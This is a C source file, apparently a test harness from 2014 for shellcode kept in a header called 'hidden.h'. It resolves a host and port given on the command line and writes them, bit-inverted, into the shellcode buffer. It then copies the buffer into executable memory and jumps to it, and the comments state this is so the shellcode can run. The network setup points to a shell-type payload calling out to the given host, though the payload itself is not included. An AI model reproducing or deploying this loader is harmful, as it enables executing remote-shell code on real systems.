
#include <windows.h>
#include <winsock.h>
#include <stdio.h>
#include <stdint.h>

#pragma comment (lib, "ws2_32.lib")
#define in_addr_t unsigned long

#include "hidden.h"

/**********************************************************************
 *  Resolve ip or hostname
 **********************************************************************/
in_addr_t resolve (char host[]) {
  struct      hostent *hp;
  in_addr_t   host_ip = 0;

  host_ip = inet_addr (host);
  
  if (host_ip == INADDR_NONE) {
    hp = gethostbyname (host);
    if (hp != NULL) {
      host_ip = *(in_addr_t *)hp->h_addr;
    }
  }
  return host_ip;
}

int main (int argc, char* argv[]) {
  uint8_t   *p;
  in_addr_t ip;
  short port;
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
  
  if (argc != 3) {
    printf ("\nUsage: hidden_test <host> <port>");
    printf ("\nExample: hidden_test localhost 80\n");
    return 0;
  }
  
  LoadLibrary ("advapi32");
  
  // required for shellcode to run
  WSADATA wsa;
  WSAStartup (MAKEWORD(2, 0), &wsa);
  
  p=(uint8_t*)&hidden[IP_ADDRESS];
  ip=~resolve (argv[1]);
  memcpy (p, &ip, sizeof (ip));
  
  p=(uint8_t*)&hidden[PORT+2];
  port=~htons (atoi(argv[2]));
  memcpy (p, &port, sizeof (port));
  
  void *exec = VirtualAlloc(0, strlen (hidden), 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, hidden, strlen (hidden));
  //DebugBreak();
  printf ("\nExecuting code...");
  ((void(*)())exec)();
  printf ("\nExiting code...");
  VirtualFree (exec, 0, MEM_RELEASE);
  WSACleanup();
  return 0;
}

